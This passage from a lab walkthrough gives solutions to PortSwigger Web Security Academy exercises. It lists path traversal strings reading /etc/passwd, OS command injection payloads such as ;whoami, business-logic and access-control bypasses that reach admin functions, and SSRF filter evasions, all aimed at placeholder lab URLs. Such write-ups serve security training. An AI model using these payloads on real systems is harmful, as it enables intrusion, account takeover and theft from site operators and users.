    filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64   (NO, complete URL encode)

    filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd    (OK, double URL encode)
    ```

5. #### **File path traversal, validation of start of path**

    ```plaintext
    https://<lab_url>/product   GET   (productId=5)
    https://<lab_url>/image     GET   (filename=50.jpg)

    filename=/var/www/images/../../../etc/passwd
    ```

6. #### **File path traversal, validation of file extension with null byte bypass**

    ```plaintext
    https://<lab_url>/product   GET   (productId=6)
    https://<lab_url>/image     GET   (filename=60.jpg)

    v1: filename=../../../etc/passwd%00.jpg
    v2: filename=../../../etc/passwd%00.png
    ```

[directory_traversal]: https://portswigger.net/web-security/file-path-traversal

---

## **[Command Injection][command_injection]**

1. #### **OS command injection, simple case**

    ```plaintext
    https://<lab_url>/product           GET     (productId=1)
    https://<lab_url>/product           POST    (productId=1&storeId=1)

    v1: productId=1&storeId=1;whoami
    v2: productId=1&storeId=1|whoami
    v3: productId=1&storeId=1%26whoami
    v4: productId=1&storeId=1%26%26whoami

    peter-AO3dKt
    ```

2. #### **Blind OS command injection with time delays**

    ```plaintext
    https://<lab_url>/feedback          GET
    https://<lab_url>/feedback/submit   POST    (csrf=...&name=Psycho&email=test@test.com&subject=Test&message=This+is+a+test.)

    v1: ...&email=test@test.com;ping+-c+10+127.1;...
    v2: ...&email=test@test.com||ping+-c+10+127.1||...
    v3: ...&email=test@test.com%26ping+-c+10+127.1%26...
    v4: ...&email=test@test.com||ping+-c+10+127.1%26%26...
    ```

3. #### **Blind OS command injection with output redirection**

    ```plaintext
    https://<lab_url>/feedback          GET
    https://<lab_url>/feedback/submit   POST    (csrf=&name=Psycho&email=test%40test.com&subject=Test&message=This+is+a+test.)

    v1: ...&email=test@test.com;whoami+>+/var/www/images/whoami.txt;...
    v2: ...&email=test@test.com|whoami+>+/var/www/images/whoami.txt|...
    v3: ...&email=test@test.com||whoami+>+/var/www/images/whoami.txt||...
    v4: ...&email=test@test.com%26whoami+>+/var/www/images/whoami.txt%26...

    https://<lab_url>/product           GET   (productId=1)
    https://<lab_url>/image             GET   (filename=10.jpg)

    filename=whoami.txt
    ```

4. #### **Blind OS command injection with out-of-band interaction**

    ```plaintext
    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
    ```

5. #### **Blind OS command injection with out-of-band data exfiltration**

    ```plaintext
    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
    ```

[command_injection]: https://portswigger.net/web-security/os-command-injection

---

## **[Business Logic Vulnerabilities][business_logic]**

### [Excessive trust in client-side controls][business_logic_1]

1. #### **Excessive trust in client-side controls**

    - After login try to buy the product and take note of the URL flow and the parameters sent, the message  
    ***Not enough store credit for this purchase*** will appear when you try to **Place order**.

    ```plaintext
    ...
    https://<lab_url>/cart      POST    (productId=1&redir=PRODUCT&quantity=1&price=133700)
    ...
    ```

    - **Remove** the product from the cart.
    - Send the **/cart POST** request to the **Repeater**.
    - Set the product **price** to any value below your current balance and repeat the request.
    - Reload the page and proceed to **Place order**  
    (notice that the **Total** becomes the set price).

2. #### **2FA broken logic** (repeated)

    > 📝 **Note:**
    <mark>This example is located within the **Vulnerabilities in multi-factor authentication**
    section of the **Authentication** topic.</mark>

### [Failing to handle unconventional input][business_logic_2]

1. #### **High-level logic vulnerability**

    - After login try to buy the product and take note of the URL flow and the parameters sent, the message  
    ***Not enough store credit for this purchase*** will appear when you try to **Place order**.

    ```plaintext
    ...
    https://<lab_url>/cart      POST    (productId=1&redir=PRODUCT&quantity=1)
    ...
    ```

    - **Remove** the product from the cart.
    - Send the **/cart POST** request to the **Repeater**.
    - Set the product **quantity** to a negative value and repeat the request.
    - Reload the page and try to **Place order**, the message  
    ***Cart total price cannot be less than zero*** will appear  
    (notice that the **Total** becomes negative).
    - **Remove** the product from the cart again.
    - Add the product to the cart again but also add another product with a negative **quantity**  
    as many times as you need to decrease the **Total** below your current balance, then proceed to **Place order**.

2. #### **Low-level logic flaw**

    > 📝 **Note:**
    <mark>If you don't have Burp Suite Pro, you can use
    [this][bussiness_logic_script_low_level] script to automate the attack.</mark>

    - After login try to buy the product and take note of the URL flow and the parameters sent, the message  
    ***Not enough store credit for this purchase*** will appear when you try to **Place order**.

    ```plaintext
    ...
    https://<lab_url>/cart      POST    (productId=1&redir=PRODUCT&quantity=1)
    ...
    ```

    - **Remove** the product from the cart.
    - Send the **/cart POST** request to the **Repeater**.
    - Set the product **quantity** to its maximum allowed value (**99**) and repeat the request.
    - Reload the page and try to **Place order**, the message  
    ***Not enough store credit for this purchase*** will appear.
    - Repeat the request again  
    (notice that even if you aren't able to buy the products because your current balance is lower
    than the **Total**, it looks like there are plenty available, what will be the limit?).
    - **Remove** the products from the cart again.
    - Send the **/cart POST** request to the **Intruder** and configure it to **Continue indefinitely** with **Null payloads**,
    then execute the attack and refresh the page until you observe something weird  
    (notice that when you reach **162** request the **Total** is **$21442806.00** but when you reach
    **163** the **Total** becomes **-$21474778.96**).
    - Stop de **Intruder** attack.
    - **Remove** the products from the cart once again.
    - Configure another **Intruder** attack but use exactly **323** rounds  
    (notice that at the middle of the process the **Total** starts to decrease until reach **-$64060.96**).
    - Set the product **quantity** to **47** and repeat the request once again  
    (notice that the **Total** becomes **-$1221.96**. Why 47? You should know why!).
    - Add another product to the cart as many times as you need to increase the **Total**
    below your current balance, then proceed to **Place order**.

3. #### **Inconsistent handling of exceptional input**

    > 📝 **Note:**
    <mark>This attack is known as **SQL Truncation**.</mark>

    - Open the **Email client**.
    - Register an account and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/register  POST    (csrf=...&username=attacker&email=attacker%40exploit-<mail_domain>.web-security-academy.net&password=attacker)
    ...
    ```

    - Login and try to access to **/admin**, the message  
    ***Admin interface only available if logged in as a DontWannaCry user*** will appear.
    - Logout and discover how the account registration process works.

    ```plaintext
    Registered username (error message: "An account already exists with that username")
    Registered email    (error message: "An account already exists with that email")

    Username value      (if more than 32 characters then error message: "Invalid username format")
    Username value      (if contains "@" then error message: "Invalid username format")
    Username value      (no distinction between lowercase and uppercase)

    Password value      (no length restriction)
    Email value         (no length restriction but the email is truncated at 255 characters)

    ```

    - Register another account but use a very long **Email** (255+ characters) and see what happens  
    (notice that you still receive the link confirmation, but when you login, the shown email is truncated).

    ```plaintext
    https://<lab_url>/register  POST

    (csrf=...&username=another_attacker&email=another_attackerrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr@%40exploit-<mail_domain>.web-security-academy.net&password=another_attacker)


    Your email is: another_attackerrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr@exploit-<mail_domain>.web-security-
    ```

    - Register another account again but use an **Email** with **dontwannacry.com**
    as a subdomain for the email domain and the length enough to be truncated at the end of **dontwannacry.com**, then login  
    (notice that your role has been set by default as administrator).

    ```plaintext
    https://<lab_url>/register  POST

    (csrf=...&username=psycho&email=psychooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo@dontwannacry.com.exploit-<mail_domain>.web-security-academy.net&password=psycho)


    Your email is: psychooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo@dontwannacry.com
    ```

### [Making flawed assumptions about user behavior][business_logic_3]

1. #### **Inconsistent security controls**

    - Open the **Email client**.
    - Register an account and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/register  POST    (csrf=...&username=attacker&email=attacker%40exploit-<lab_domain>.web-security-academy.net&password=attacker)
    ...
    ```

    - Login and observe that there's a form to change your **Email**.
    - Change your **Email** to an any arbitrary **@dontwannacry.com** email.

    ```plaintext
    https://<lab_url>//my-account/change-email      POST    (email=attacker%40dontwannacry.com&csrf=...)


    Your email is: attacker@dontwannacry.com
    ```

2. #### **Weak isolation on dual-use endpoint**

    - After login interact with the functionalities of the site and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/my-account/change-email       POST    (email=psycho%40dontwannacry.com.com&csrf=...)
    ...
    https://<lab_url>/my-account/change-password    POST    (csrf=...&username=wiener&current-password=peter&new-password-1=psycho&new-password-2=psycho)
    ...
    ```

    - Send the **/change-password POST** request to the **Repeater**.
    - Delete all the parameters one by one while you repeat the request and see what happens  
    (notice that the **current-password** is not required).

    ```plaintext
    https://<lab_url>/my-account/change-password    POST    (csrf=...&username=wiener&new-password-1=psycho&new-password-2=psycho)
    ```

    - Set the **username** as **administrator** and repeat the request again, then logout and login as **administrator**.

    ```plaintext
    https://<lab_url>/my-account/change-password    POST    (csrf=...&username=administrator&new-password-1=psycho&new-password-2=psycho)
    ```

3. #### **Password reset broken logic** (repeated)

    > 📝 **Note:**
    <mark>This example is located within the **Vulnerabilities in other authentication mechanisms**
    section of the **Authentication** topic.</mark>

4. #### **2FA simple bypass** (repeated)

    > 📝 **Note:**
    <mark>This example is located within the **Vulnerabilities in multi-factor authentication**
    section of the **Authentication** topic.</mark>

5. #### **Insufficient workflow validation**

    - After login try to buy the product and take note of the URL flow and the parameters sent, the message  
    ***Not enough store credit for this purchase*** will appear when you try to **Place order**.

    ```plaintext
    ...
    https://<lab_url>/cart                      POST    (productId=1&redir=PRODUCT&quantity=1)
    ...
    https://<lab_url>/cart/checkout             POST    (csrf=...)
    https://<lab_url>/cart                      GET     (err=INSUFFICIENT_FUNDS)
    ...
    ```

    - **Remove** the product from the cart.
    - Repeat the purchase process with another product you can afford with your current balance
    and take note of the URL flow and the parameters sent, the message  
    ***Your order is on its way!*** will appear when you **Place order**.

    ```plaintext
    ...
    https://<lab_url>/cart                      POST    (productId=2&redir=PRODUCT&quantity=1)
    ...
    https://<lab_url>/cart/checkout             POST    (csrf=...)
    https://<lab_url>/cart/order-confirmation   GET     (order-confirmed=true)
    ...
    ```

    - Send the first **/cart POST** and the second **/cart/order-confirmation GET** requests to the
    **Repeater**.
    - Repeat both requests.

6. #### **Authentication bypass via flawed state machine**

    - Login and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/login             POST    (csrf=...&username=wiener&password=peter)
    https://<lab_url>/role-selector     GET
    https://<lab_url>/role-selector     POST    (role=content-author&csrf=...)
    ...
    https://<lab_url>/my-account        GET     (id=wiener)
    ...
    ```

    - Try to access to **/admin**, the message  
    ***Admin interface only available if logged in as an administrator*** will appear.
    - Logout and login again but intercept and **Forward** the **/login POST** request, then **Drop** the next **/role-selector GET** request.
    - Access directly to the **/my-accout** url  
    (notice that your role has been set by default as administrator).

### [Domain-specific flaws][business_logic_4]

1. #### **Flawed enforcement of business rules**

    - After login try to buy the product, the message  
    ***Not enough store credit for this purchase*** will appear when you try to **Place order**.
    - Observe there's a message for new customers on the top of the page:  
    ***New customers use code at checkout: NEWCUST5***.
    - Also observe there's a form to sign up for newsletter at the bottom of the main page.
    - After sign up for the newsletter, the message  
    ***Use coupon SIGNUP30 at checkout!*** will appear.
    - ***Try applying the codes more than once. Notice that if you enter the same code twice in a row,
    it is rejected because the coupon has already been applied.
    However, if you alternate between the two codes, you can bypass this control.***
    - Apply both codes as many times as you need to decrease the **Total**
    below your current balance, then proceed to **Place order**.

2. #### **Infinite money logic flaw**

    - After login try to buy the product, the message  
    ***Not enough store credit for this purchase*** will appear when you try to **Place order**.
    - Observe there's a form to sign up for newsletter at the bottom of the main page.
    - After sign up for the newsletter, the message  
    ***Use coupon SIGNUP30 at checkout!*** will appear.
    - Observe ***you can buy $10 gift cards and redeem them from the "My account" page.***
    - Buy and redeem a **Gift Card** and take note of the URL flow and the parameters sent  
    (don't forget to use the coupon before the purchase).

    ```plaintext
    ...
    https://<lab_url>/cart                      POST    (productId=2&redir=PRODUCT&quantity=1)
    ...
    https://<lab_url>/cart/coupon               POST    (csrf=...&coupon=SIGNUP30)
    ...
    https://<lab_url>/cart/checkout             POST    (csrf=...)
    https://<lab_url>/cart/order-confirmation   GET     (order-confirmed=true)
    ...
    https://<lab_url>/gift-card                 POST    (csrf=...&gift-card=<code>)
    ```

    - Observe after the card redeem, you current balance increases by **$3**.
    - Set up a **MACRO** to repeat the purchase-redeem process, then proceed to **Place order**.

### [Providing an encryption oracle][business_logic_5]

1. #### **Authentication bypass via encryption oracle**

    ```plaintext
    PENDING
    ```

[business_logic]:   https://portswigger.net/web-security/logic-flaws
[business_logic_1]: https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls
[business_logic_2]: https://portswigger.net/web-security/logic-flaws/examples#failing-to-handle-unconventional-input
[bussiness_logic_script_low_level]: https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/Business%20Logic/Low-level%20logic%20flaw
[business_logic_3]: https://portswigger.net/web-security/logic-flaws/examples#making-flawed-assumptions-about-user-behavior
[business_logic_4]: https://portswigger.net/web-security/logic-flaws/examples#domain-specific-flaws
[business_logic_5]: https://portswigger.net/web-security/logic-flaws/examples#providing-an-encryption-oracle

---

## **Information Disclosure**

## **[Information Disclosure][information_disclosure]**

1. #### **Information disclosure in error messages**

    - Interact with the products of the site and take note of the URL flow and the parameters sent.

    ```plaintext
    https://<lab_url>/product       GET    (productId=1)
    ...
    https://<lab_url>/product       GET    (productId=20)
    ```

    - Send any of the **/product GET** requests to the **Repeater**.
    - Set the product **productId** to a non-intenger value and repeat the request.

    ```java
    Internal Server Error: java.lang.NumberFormatException: For input string: "asdfg"
    at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
    at java.base/java.lang.Integer.parseInt(Integer.java:668)
    at java.base/java.lang.Integer.parseInt(Integer.java:786)
    ...
    at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
    at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
    at java.base/java.lang.Thread.run(Thread.java:833)
    Apache Struts 2 2.3.31
    ```

2. #### **Information disclosure on debug page**

    - Look at the page source code.

    ```html
    ...
    <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
    ...
    ```

    - Access the exposed file **/cgi-bin/phpinfo.php**.

    ```plaintext
    ...
    SECRET_KEY    z0dyvx6boonewxb9wq04o1x2h3ciucfq
    ...
    ```

3. #### **Source code disclosure via backup files**

    - Look at the **robots.txt** and **sitemap.xml** files.

    ```plaintext
    User-agent: *
    Disallow: /backup
    ```

    - Access the URL **/backup** exposed in the **robots.txt** file.

    ```plaintext
    Index of /backup
    Name                        Size
    ProductTemplate.java.bak    1643B
    ```

    - Access the exposed file **ProductTemplate.java.bak**.

    ```java
    ...
    ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
        "org.postgresql.Driver",
        "postgresql",
        "localhost",
        5432,
        "postgres",
        "postgres",
        "v9x0m9cfq0rojvqx564r89kto3x2f8sa"
    ).withAutoCommit();
    ...
    ```

4. #### **Authentication bypass via information disclosure**

    - Login and try to access to **/admin**, the message  
    ***Admin interface only available to local users*** will appear.
    - Send the **/admin GET** request to the **Repeater**.
    - Set the HTTP request **method** to **TRACE** and repeat the request.
    - Analyze the response and note the presence of the header **X-Custom-IP-Authorization**  
    (notice that its value is your current IP adress).
    - Set the HTTP request **method** back to **GET**, add the **X-Custom-IP-Authorization**
    header with the value **127.0.0.1** and repeat the request.

    ```plaintext
    https://<lab_url>/admin                             GET     401 Unauthorized

    https://<lab_url>/admin                             TRACE   200 OK

    https://<lab_url>/admin                             GET     200 OK    (X-Custom-IP-Authorization: 127.0.0.1)
    https://<lab_url>/admin/delete?username=carlos
    ```

5. #### **Information disclosure in version control history**

    - Look at the **.git** directory.

    ```plaintext
    Index of /.git
    Name            Size
    <branches>
    description     73B
    <hooks>
    <info>
    <refs>
    HEAD            23B
    config          152B
    <objects>
    index           225B
    COMMIT_EDITMSG  34B
    <logs>
    ```

    - Download the folder content.

    ```bash
    wget --recursive https://<lab_url>/.git
    ```

    - Analyze the files via **git**.

    ```bash
    cd <lab_url>

    git status
        ...
        deleted:    admin.conf
        deleted:    admin_panel.php
        ...

    git log
        commit 0db732bd771a601521fbaa6c681a7b77a29421ef (HEAD -> master)
        ...
        Remove admin password from config

        commit 378b8d2a56fcd551df0c62c36918c51398f5a9d8
        ...
        Add skeleton admin panel

    git diff
        diff --git a/admin.conf b/admin.conf
        deleted file mode 100644
        index 21d23f1..0000000
        --- a/admin.conf
        +++ /dev/null
        @@ -1 +0,0 @@
        -ADMIN_PASSWORD=env('ADMIN_PASSWORD')
        diff --git a/admin_panel.php b/admin_panel.php
        deleted file mode 100644
        index 8944e3b..0000000
        --- a/admin_panel.php
        +++ /dev/null
        @@ -1 +0,0 @@
        -<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
        \ No newline at end of file
    ```

    - **Restore** the deleted files and **reset** the first commit.

    ```bash
    git restore admin.conf admin_panel.php

    git reset 378b8d2a56fcd551df0c62c36918c51398f5a9d8
    ```

    - Open the restored files.

    ```bash
    cat admin_panel.php
        <?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
    ```

    ```bash
    cat admin.conf
        ADMIN_PASSWORD=79b97ud19cs3148e0e7t
    ```

[information_disclosure]: https://portswigger.net/web-security/information-disclosure

---

## **[Access Control][access_control]**

1. #### **Unprotected admin functionality**

    - Look at the **robots.txt** and **sitemap.xml** files.

    ```plaintext
    User-agent: *
    Disallow: /administrator-panel
    ```

    - Access the URL **/administrator-panel** exposed in the **robots.txt** file.

    ```plaintext
    https://<lab_url>/administrator-panel
    https://<lab_url>/administrator-panel/delete?username=carlos
    ```

2. #### **Unprotected admin functionality with unpredictable URL**

    - Look at the page source code.

    ```javascript
    ...
    var isAdmin = false;
    if (isAdmin) {
        var topLinksTag = document.getElementsByClassName("top-links")[0];
        var adminPanelTag = document.createElement('a');
        adminPanelTag.setAttribute('href', '/admin-b5x8jc');
        adminPanelTag.innerText = 'Admin panel';
        topLinksTag.append(adminPanelTag);
        var pTag = document.createElement('p');
        pTag.innerText = '|';
        topLinksTag.appendChild(pTag);
    }
    ...
    ```

    - Access the exposed URL **/admin-b5x8jc**.

    ```plaintext
    https://<lab_url>/admin-b5x8jc
    https://<lab_url>/admin-b5x8jc/delete?username=carlos
    ```

3. #### **User role controlled by request parameter**

    - Login and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/login         POST    (csrf=...&username=wiener&password=peter)
    https://<lab_url>/my-account    GET     (Cookie: session=...; Admin=false)
    ...
    ```

    - Try to access to **/admin**, the message  
    ***Admin interface only available if logged in as an administrator*** will appear.
    - Send the **/admin GET** request to the **Repeater**.
    - Set the **Admin** cookie to **true** and repeat the request.

    ```plaintext
    https://<lab_url>/admin                             GET     401 Unauthorized    (Cookie: session...; Admin=false)

    https://<lab_url>/admin                             GET     200 OK              (Cookie: session...; Admin=true)
    https://<lab_url>/admin/delete?username=carlos
    ```

4. #### **User role can be modified in user profile**

    - Login and try to access to **/admin**, the message  
    ***Admin interface only available to local users*** will appear.
    - Update your email and take note of the URL flow and the parameters sent  
    (notice that the response leaks the parameter **roleid**).

    ```plaintext
    ...
    https://<lab_url>/my-account/change-email           POST    ({"email":"test@test.com"})
    ...
    ```

    - Send the **/change-mail POST** request to the **Repeater**.
    - Add the **roleid** parameter with the value **2** and repeat the request  
    (notice that in the response, the parameter **roleid** has changed).
    - Try to access to **/admin** again.

    ```plaintext
    https://<lab_url>/admin
    https://<lab_url>/admin/delete?username=carlos
    ```

5. #### **URL-based access control can be circumvented**

    - Try to access to **/admin**, the message  
    ***Access denied*** will appear.
    - Send the **/admin GET** request to the **Repeater**.
    - Remove **admin** from the URL (keep only **/**), add the **X-Original-URL**
    header with any value and repeat the request, the message  
    ***Not Found*** will appear (***this indicates that the back-end system is processing the URL from the X-Original-URL header***).
    - Set the **X-Original-URL** to **/admin** and repeat the request.
    - Set the **X-Original-URL** to **/admin/delete?username=carlos** and repeat the request, the message  
    ***Missing parameter 'username'*** will appear.
    - Remove **?username=carlos** from the header and add it to the URL.

    ```plaintext
    https://<lab_url>/admin                             GET     403 Forbidden

    https://<lab_url>/                                  GET     404 Not Found   (X-Original-URL: /asdfg)
    https://<lab_url>/                                  GET     200 OK          (X-Original-URL: /admin)
    https://<lab_url>/                                  GET     400 Bad Request (X-Original-URL: /admin/delete?username=carlos)
    https://<lab_url>/?username=carlos                                          (X-Original-URL: /admin/delete)
    ```

6. #### **Method-based access control can be circumvented**

    - Login as **administrator**, upgrade the user **carlos** and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/admin         GET
    https://<lab_url>/admin-roles   POST    (username=carlos&action=upgrade)
    ...
    ```

    - Logout, login as **wiener** and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/login/        POST    (username=wiener&password=peter)
    https://<lab_url>/my-account    GET     (Cookie: session=oThfWMkrZwGocUrabMRikdz8ACevqQFh)
    ...
    ```

    - Try to access to **/admin**, the message  
    ***Admin interface only available if logged in as an administrator*** will appear.
    - Send the first **/admin-roles POST** request to the **Repeater**.
    - Set the **session** cookie to the **wiener**'s cookie, set the **username** to **wiener**,
    **Change request method** and repeat the request.

    ```plaintext
    https://<lab_url>/admin-roles   GET     (Cookie: session=oThfWMkrZwGocUrabMRikdz8ACevqQFh,
                                            username=wiener&action=upgrade)
    ```

7. #### **User ID controlled by request parameter**

    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.

    ```plaintext
    https://<lab_url>/my-account    GET     (id=wiener)
    ```

    - Send the **/my-account GET** request to the **Repeater**.
    - Set the user **id** to **carlos** and repeat the request.

    ```plaintext
    https://<lab_url>/my-account    GET     (id=carlos)

    D0CkMQ0ES35JORZdDVecVChxKZVmGxuL
    ```

8. #### **User ID controlled by request parameter, with unpredictable user IDs**

    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.

    ```plaintext
    https://<lab_url>/my-account    GET     (id=cd88156d-5bab-4e7e-a6d4-f1c0a9fdbec3)
    ```

    - Send the **/my-account GET** request to the **Repeater**.
    - Look at the page source code of each of the blog posts.

    ```html
    postId=1
        ...
        ...<a href='/blogs?userId=02246043-bc39-4982-8ed6-643a0c294947'>administrator</a>...
        ...

    postId=2
        ...
        ...<a href='/blogs?userId=cd88156d-5bab-4e7e-a6d4-f1c0a9fdbec3'>wiener</a>...
        ...

    postId=3
        ...
        ...<a href='/blogs?userId=6070861f-8d1e-420d-85e4-44ba24f1f118'>carlos</a>...
        ...

    ```

    - Set the user **id** to the **carlos**'s **id** and repeat the request.

    ```plaintext
    https://<lab_url>/my-account    GET     (id=070861f-8d1e-420d-85e4-44ba24f1f118)

    Your API Key is:    uDu438H9xfPjDfUfGMP2Hizv1LLmV4ld
    ```

9. #### **User ID controlled by request parameter with data leakage in redirect**

    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.

    ```plaintext
    https://<lab_url>/my-account    GET     (id=wiener)
    ```

    - Send the **/my-account GET** request to the **Repeater**.
    - Set the user **id** to **carlos** and repeat the request  
    (notice that the **carlos**'s profile page is displayed before the redirect).

    ```plaintext
    https://<lab_url>/my-account    GET     (id=carlos)

    Your API Key is: zuM25r4y1Hm88aqakr19Dv3sKg3aMpRO
    ```

10. #### **User ID controlled by request parameter with password disclosure**

    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.

    ```plaintext
    https://<lab_url>/my-account    GET     (id=wiener)
    ```

    - Send the **/my-account GET** request to the **Repeater**.
    - Set the user **id** to **administrator** and repeat the request.

    ```html
    ...
    <input required type=password name=password value='xr21jnqtnj37s2fz41h6'/>
    ...
    ```

11. #### **Insecure direct object references**

    - Interact with the **Live chat** and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/download-transcript               POST
    https://<lab_url>/download-transcript/2.txt         GET
    ...
    ```

    - Send the **/download-transcript/2.txt GET** request to the **Repeater**.
    - Set the **txt** filename to **1.txt** and repeat the request.

    ```plaintext
    CONNECTED: -- Now chatting with Hal Pline --
    You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
    Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
    You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
    Hal Pline: Takes one to know one
    You: Ok so my password is m8zm935rsbzfy61lhgo8. Is that right?
    Hal Pline: Yes it is!
    You: Ok thanks, bye!
    Hal Pline: Do one!
    ```

12. #### **Multi-step process with no access control on one step**

    - Login as **administrator**, upgrade the user **carlos** and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/admin         GET
    https://<lab_url>/admin-roles   POST    (username=carlos&action=upgrade)
    https://<lab_url>/admin-roles   POST    (action=upgrade&confirmed=true&username=carlos)
    ...
    ```

    - Logout, login as **wiener** and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/login/        POST    (username=wiener&password=peter)
    https://<lab_url>/my-account    GET     (Cookie: session=3DXvIkJ1NEBa0QqtVqK0ja6uly3MOsk8)
    ...
    ```

    - Try to access to **/admin**, the message  
    ***Admin interface only available if logged in as an administrator*** will appear.
    - Send the first (confirmed) **/admin-roles POST** request to the **Repeater**.
    - Set the **session** cookie to the **wiener**'s cookie,
    set the **username** to **wiener** and repeat the request.

    ```plaintext
    https://<lab_url>/admin-roles   POST    (Cookie: session=3DXvIkJ1NEBa0QqtVqK0ja6uly3MOsk8,
                                            action=upgrade&confirmed=true&username=wiener)
    ```

13. #### **Referer-based access control**

    > 📝 **Note:**
    <mark>Although this lab looks the same as the previous one, it's different:
    If you remove the **Referer** header, it doesn't works.  
    This is because ***Some websites base access controls on the Referer header submitted in the HTTP request.***.</mark>

    - Login as **administrator**, upgrade the user **carlos** and take note of the URL flow and the parameters sent.

    ```plaintext
    ...
    https://<lab_url>/admin         GET
    https://<lab_url>/admin-roles   GET     (username=carlos&action=upgrade)
    ...
    ```

    - Logout, login as **wiener** and take note of the URL flow and the parameters sent.

    ```plaintext
    https://<lab_url>/login/        POST    (username=wiener&password=peter)
    https://<lab_url>/my-account    GET     (Cookie: session=J0rtlZCXo6I23lQleAqEBTiBRc4C4Ybw)
    ```

    - Try to access to **/admin**, the message  
    ***Admin interface only available if logged in as an administrator*** will appear.
    - Send the first **/admin-roles GET** request to the **Repeater**.
    - Set **session** cookie to the **wiener**'s cookie,
    set the **username** to **wiener** and repeat the request  

    ```plaintext
    https://<lab_url>/admin-roles   GET     (Cookie: session=J0rtlZCXo6I23lQleAqEBTiBRc4C4Ybw,
                                            username=wiener&action=upgrade)
    ```

[access_control]: https://portswigger.net/web-security/access-control

---

<!--
## **File Upload Vulnerabilities**
-->

## **[Server-Side Request Forgery (SSRF)][ssrf]**

### [Common SSRF attacks][ssrf_common_attacks]

1. #### **Basic SSRF against the local server**

    - Click **View details** of any product then **Check stock** and take note of the URL flow and the parameters sent.

    <br>

    ```plaintext
    https://<lab_url>/product               GET     (productId=1)
    https://<lab_url>/product/stock         POST
                                            (stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1)
    ```

    - Send the **/product/stock POST** request to the **Repeater**.
    - Repeat the request but changing manually the **stockApi** URL.

    <br>

    ```plaintext
    stockApi=http://127.0.0.1
    stockApi=http://127.0.0.1/admin
    stockApi=http://127.0.0.1/admin/delete?username=carlos
    ```

2. #### **Basic SSRF against another back-end system**

    ```plaintext
    https://<lab_url>/product               GET     (productId=2)
    https://<lab_url>/product/stock         POST    (stockApi=http://192.168.0.1:8080/product/stock/check?productId=2&storeId=2)
    ```

    ```plaintext
    stockApi=http://192.168.0.0:8080
    stockApi=http://192.168.0.1:8080
    stockApi=http://192.168.0.2:8080
    ...
    stockApi=http://192.168.0.33:8080

    stockApi=http://192.168.0.33:8080/admin
    stockApi=http://192.168.0.33:8080/admin/delete?username=carlos
    ```

3. #### **SSRF with blacklist-based input filter**

    ```plaintext
    https://<lab_url>/product               GET     (productId=3)
    https://<lab_url>/product/stock         POST
                                            (stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=3)
    ```

    ```plaintext
    stockApi=http://127.0.0.1                           (NO)
    stockApi=http://127.1                               (OK)
    stockApi=http://127.1/admin                         (NO)
    stockApi=http://127.1/./admin                       (NO)
    stockApi=http://127.1/%61%64%6d%69%6e               (NO, URL encode)

    v1
    stockApi=http://127.1/AdMiN                         (OK)
    stockApi=http://127.1/AdMiN/delete?username=carlos

    v2
    stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65                         (OK, double URL encode)
    stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
    ```

4. #### **SSRF with whitelist-based input filter**

    ```plaintext
    https://<lab_url>/product               GET     (productId=4)
    https://<lab_url>/product/stock         POST
